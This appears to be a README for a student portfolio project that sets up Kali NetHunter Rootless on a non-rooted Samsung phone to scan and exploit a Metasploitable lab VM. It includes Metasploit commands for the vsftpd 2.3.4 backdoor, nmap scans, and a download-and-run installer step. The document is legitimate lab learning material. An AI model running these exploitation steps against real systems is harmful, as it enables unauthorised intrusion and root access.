# Pocket SOC Toolkit - Rootless

A mobile Security Operations Center Toolkit
built on a non-rooted Android device using
Kali NetHunter Rootless.

## Device
- Model: Samsung Galaxy S20 FE
- OS: Android 13 / One Ui 5.1
- RAM: 6GB
- Root: No (non-rooted)
- Environment: Kali NetHunter Rootless

## Objective
Transform a non-rooted smartphone into a
portable SOC investigation platform capable
of performing real world security analysis
against vulnerable lab systems.

## Lab Environment
- Attacker: Samsung Galaxy S20 FE
- Target: Metasploitable Virtual Machine
- Platform: VMWare Workstation Pro
- Network: Bridged

## Installation
1. Install Termux from F-Droid
2. Update Termux packages
   pkg update && pkg upgrade
3. Install wget
   pkg install wget
4. Download NetHunter installer
   wget -O install-nethunter-termux https://offs.ec/2MceZWr
5. Make executable
   chmod +x install-nethunter-termux
6. Run installer
   ./install-nethunter-termux
7. Select option 1 (Full image)
8. Launch NetHunter
   nethunter
9. Fix DNS
   echo "nameserver 8.8.8.8" > /etc/resolv.conf
10. Update Kali
    sudo apt update && sudo apt upgrade -y
11. Install tools
    sudo apt install -y nmap python3 python3-pip net-tools dnsutils curl

## Investigation Workflow

### Step 1 - Network Scan
nmap --unprivileged -sT -sV [Target IP] -oA scans/scan

### Step 2 - Automated Analysis
python3 scripts/soc_scanner_v1.py

### Step 3 - Exploitation
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS [Target IP]
set LHOST [Attacker IP]
run

### Step 4 - Full Port Scan
nmap --unprivileged -sT -sV -p- [Target IP] -oA scans/full_scan

## Results
- Default scan: 23 open ports
- Full scan: 30 open ports
- Critical Findings: 10 services
- Exploitation: vsftpd 2.3.4 backdoor
- Access gained: root shell

## Critical Services Discovered
- Port 21   - FTP vsftpd 2.3.4
- Port 23   - Telnet
- Port 512  - Exec
- Port 513  - Login
- Port 514  - Shell
- Port 1524 - Bindshell
- Port 2121 - FTP ProFTPD 1.3.1
- Port 5900 - VNC
- Port 6667 - IRC
- Port 6697 - IRC

## Limitations (Rootless)
- No raw packet scans (SYN scan)
- No wireless injection
- No HID attacks
- Must use --unprivileged flag with nmap

## Skills Demonstrated
- Network reconnaisance
- Service enumeration
- Vulnerability assessment
- Python automation
- Metasploit exploitation
- Security reporting

## Version
v1.0 - Initial rootless implementation
